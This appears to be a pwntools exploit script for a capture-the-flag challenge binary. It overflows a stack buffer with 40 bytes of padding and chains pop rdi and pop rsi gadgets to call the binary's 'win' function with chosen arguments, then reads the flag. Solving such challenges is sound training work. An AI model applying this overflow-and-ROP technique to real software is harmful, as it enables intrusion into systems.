#!/usr/bin/python3.8
import warnings
from pwn import *
from termcolor import colored
warnings.filterwarnings("ignore")

fname = "./challenge2" 

LOCAL =True# False

e     = ELF(fname)
rop   = ROP(e)

prompt = ">"

def pwn():
  # Find the overflow offset
  offset = 40
  
  # Open a local process or a remote instance
  if LOCAL:
    r   = process(fname)
  else:
    r   = remote("0.0.0.0", 1337)

  payload  = b"A"*offset
  payload += p64(rop.find_gadget(["pop rdi"])[0])
  payload += p64(0xdeadbeef)
  payload += p64(rop.find_gadget(["pop rsi"])[0])
  payload += p64(0xc0deb4be)
  payload += p64(0x1337b4be)
  payload += p64(e.sym.win)
  r.sendlineafter(">",  payload)

  # Read flag - unstable connection
  try:
    flag = r.recvline_contains("FLAG").decode()
    print(colored("\n[+] Flag: {}\n".format(flag), "green"))
  except:
    print(colored("\n[-] Failed to connect or get flag.txt!\n", "red"))

if __name__ == "__main__":
  pwn()
